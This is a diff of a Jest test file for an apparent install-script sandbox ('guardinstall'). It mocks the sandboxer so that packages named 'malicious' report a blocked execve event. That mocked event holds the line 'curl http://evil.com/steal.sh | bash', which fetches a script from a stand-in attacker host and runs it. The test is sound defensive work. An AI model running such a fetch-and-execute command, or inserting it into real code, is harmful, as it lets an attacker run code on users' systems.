@@ -1,23 +1,22 @@
 import { runSandbox } from '../orchestrator'
 import { evaluateEvents } from '@guardinstall/policy-engine'
-import * as path from 'path'
-import * as fs from 'fs'
 
-// Mock the orchestrator to simulate malicious behavior
-jest.mock('../orchestrator', () => ({
-  runSandbox: jest.fn().mockImplementation((packages: any[]) => {
-    return packages.map((pkg: any) => ({
-      package: pkg.name,
-      blocked: pkg.name.includes('malicious'),
-      events: pkg.name.includes('malicious') ? [{
+// Mock the sandboxer to return controlled results
+jest.mock('../sandboxer', () => ({
+  runSandboxed: jest.fn().mockImplementation((scriptPath: string, packageName: string) => {
+    const isMalicious = packageName.includes('malicious')
+    return {
+      package: packageName,
+      blocked: isMalicious,
+      events: isMalicious ? [{
         event: 'syscall_intercepted',
-        package: `${pkg.name}@${pkg.version}`,
+        package: packageName,
         syscall: 'execve',
         args: ['/bin/sh', ['-c', 'curl http://evil.com/steal.sh | bash']],
         action: 'blocked',
         timestamp_ns: Date.now() * 1000000
       }] : []
-    }))
+    }
   })
 }))
 
@@ -38,7 +37,7 @@ describe('End-to-End: Malicious Package Detection', () => {
 
   it('should allow legitimate packages like esbuild', async () => {
     const packages = [
-      { name: 'esbuild', version: '0.20.2', path: '/test', isNew: true }
+      { name: 'esbuild', version: '0.20.2', path: '/test', isNew: false }
     ]
 
     const results = await runSandbox(packages)
